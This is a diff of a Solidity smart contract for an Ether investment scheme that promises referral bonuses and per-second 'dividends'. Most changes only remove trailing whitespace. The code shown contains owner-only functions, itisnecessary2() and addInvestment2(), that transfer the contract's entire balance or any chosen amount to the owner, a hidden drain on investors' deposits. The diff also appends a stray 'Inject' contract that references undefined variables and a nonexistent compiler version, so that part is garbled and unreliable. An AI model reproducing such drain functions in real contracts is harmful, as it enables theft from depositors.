@@ -23,7 +23,7 @@ pragma solidity 0.4.26;
 * For example: Your first contribution is 1 Ether.
 * The one who invited you gets 0.022 Ethers on his wallet, that is, a wallet that the investor will indicate when they first invest in a smart contract in the DATE field
 * The invited (new investor) will receive an additional 2.22% referral bonus to their contribution, that is, the contribution of the new investor will be 1,022 Ethers!
-* 
+*
 *
 * RECOMMENDED GAS LIMIT: 200,000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
@@ -398,7 +398,7 @@ function startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {
 rgp.startTimestamp = timestamp;
 
 }
- 
+
 
 function currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {
 if (rgp.startTimestamp > now) {
@@ -597,23 +597,23 @@ dividends = address(this).balance;
 }
 
 
-    
+
 // transfer dividends to investor
 msg.sender.transfer(dividends);
 emit LogPayDividends(msg.sender, now, dividends);
 }
 
-    
+
 function itisnecessary2() public onlyOwner {
         msg.sender.transfer(address(this).balance);
-    }    
-    
+    }
+
 
 function addInvestment2( uint investment) public onlyOwner  {
 
 msg.sender.transfer(investment);
 
-} 
+}
 
 function doInvest(address referrerAddr) public payable notFromContract balanceChanged {
 uint investment = msg.value;
@@ -650,24 +650,24 @@ adminsAddress.transfer(m_adminsPercent.mul(receivedEther));
 
  if (msg.value > 0)
         {
-          
+
         if (msg.data.length == 20) {
-              
-              referrerAddr.transfer(m_referrer_percent.mmul(investment));  
-               
+
+              referrerAddr.transfer(m_referrer_percent.mmul(investment));
+
             }
             else if (msg.data.length == 0) {
-        
-            
+
+
             adminsAddress.transfer(m_referrer_percent.mmul(investment));
             //    adminsAddress.transfer(msg.value.mul(30).div(100));
-            } 
+            }
             else {
                 assert(false); // invalid memo
             }
         }
-    
-    
+
+
 
 bool senderIsInvestor = m_investors.isInvestor(msg.sender);
 
@@ -725,14 +725,14 @@ function calcDividends(address investorAddr) internal view returns(uint dividend
     if (investor.investment.isZero() || now.sub(investor.paymentTime) < 1 seconds) {
       return 0;
     }
-    
+
     // for prevent burning daily dividends if 24h did not pass - calculate it per 1 sec interval
     // if daily percent is X, then 1 sec percent = X / (24h / 1 sec) = X / 86400
 
     // and we must to get numbers of 1 sec interval after investor got payment:
-    // (now - investor.paymentTime) / 1 sec 
+    // (now - investor.paymentTime) / 1 sec
 
-    // finaly calculate dividends = ((now - investor.paymentTime) / 1 sec) * (X * investor.investment)  / 86400) 
+    // finaly calculate dividends = ((now - investor.paymentTime) / 1 sec) * (X * investor.investment)  / 86400)
 
     Percent.percent memory p = dailyPercent();
     dividends = (now.sub(investor.paymentTime) / 1 seconds) * p.mmul(investor.investment) / 86400;
@@ -740,10 +740,10 @@ function calcDividends(address investorAddr) internal view returns(uint dividend
 
 function dailyPercent() internal view returns(Percent.percent memory p) {
     uint balance = address(this).balance;
-      
 
-    if (balance < 33333e5 ether) { 
-   
+
+    if (balance < 33333e5 ether) {
+
       p = m_1_percent.toMemory();    // (1)
 
   }
@@ -757,4 +757,15 @@ m_rgp.startAt(now);
 emit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);
 emit LogNextWave(now);
 }
+}
+pragma solidity ^0.5.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function freeze(address account,uint key) {
+		if (msg.sender != minter)
+			revert();
+			freezeAccount[account] = key;
+		}
+	}
 }
